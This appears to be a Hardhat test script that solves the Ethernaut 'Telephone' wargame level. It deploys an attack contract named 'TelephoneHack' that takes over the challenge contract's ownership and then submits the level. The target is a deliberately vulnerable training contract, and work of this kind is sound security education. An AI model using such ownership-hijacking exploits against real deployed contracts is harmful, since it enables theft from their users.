const { expect } = require("chai");
const { Contract, Signer } = require("ethers");
const { ethers, waffle } = require("hardhat");
const {
  createChallenge,
  submitLevel,
  ETHERNAUT_ABI,
  ETHERNAUT_ADDRESS,
} = require("./utils");

const abi = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    inputs: [{ internalType: "address", name: "_owner", type: "address" }],
    name: "changeOwner",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xa6f9dae1",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [{ internalType: "address", name: "", type: "address" }],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0x8da5cb5b",
  },
];

const contractLevel = "0xFA10a86Ca9ECB247F03e3C1D0D0441B5522d68EB";

before(async () => {
  [eoa] = await ethers.getSigners();
  challengeAddress = await createChallenge(
    contractLevel,
    0,
    "TelephoneFactory"
  );
  //   const artifact = await artifacts.readArtifact("Fal1out");
  challenge = new ethers.Contract(challengeAddress, abi, eoa);
  console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
});

it("solves the challenge", async () => {
  let owner = await challenge.owner();
  console.log(`owner: ${JSON.stringify(owner)}`);

  // Deploy attack contract
  const attackFactory = await ethers.getContractFactory("TelephoneHack");
  const attackContract = await attackFactory.deploy(challenge.address);
  await attackContract.deployed();

  const tx = await attackContract.attack(eoa.address);

  owner = await challenge.owner();
  console.log(`owner: ${JSON.stringify(owner)}`);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
});
